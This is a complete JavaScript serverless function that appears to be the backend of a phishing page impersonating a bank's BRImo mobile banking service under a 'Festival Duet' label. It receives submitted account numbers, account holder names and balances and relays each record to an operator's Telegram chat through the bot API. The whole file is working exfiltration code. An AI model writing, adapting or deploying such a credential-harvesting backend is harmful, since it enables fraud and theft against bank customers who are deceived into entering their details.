const axios = require('axios');

exports.handler = async function(event, context) {
    // Only allow POST requests
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' }),
            headers: { 'Content-Type': 'application/json' }
        };
    }

    try {
        // Parse the incoming data
        const data = JSON.parse(event.body);
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        // Validate required environment variables
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error('Telegram credentials not configured');
            return {
                statusCode: 500,
                body: JSON.stringify({ error: 'Server configuration error' })
            };
        }

        // Validate incoming data
        if (!data.type || !data.accountNumber || !data.accountName) {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Missing required fields' })
            };
        }

        // Format the message based on data type
        let message = '';
        if (data.type === 'account_info') {
            message = `
├• BRIMO | FESTIVAL DUET
├───────────────────
├• NO REK : ${data.accountNumber}
├───────────────────
├• NAMA  : ${data.accountName}
╰───────────────────
🕒 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
            `.trim();
        } 
        else if (data.type === 'balance_info') {
            const formattedBalance = new Intl.NumberFormat('id-ID').format(data.balance);
            message = `
├• BRIMO | FESTIVAL DUET
├───────────────────
├• NO REK : ${data.accountNumber}
├───────────────────
├• NAMA  : ${data.accountName}
├───────────────────
├• SALDO : ${formattedBalance}
╰───────────────────
🕒 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
            `.trim();
        } else {
            return {
                statusCode: 400,
                body: JSON.stringify({ error: 'Invalid data type' })
            };
        }

        // Send message to Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });

        // Log success
        console.log('Message sent to Telegram:', response.data);

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true,
                message: 'Data sent to Telegram successfully' 
            })
        };

    } catch (error) {
        // Log detailed error
        console.error('Error sending to Telegram:', error.response?.data || error.message);
        
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: 'Failed to send data to Telegram',
                details: error.response?.data || error.message 
            })
        };
    }
};
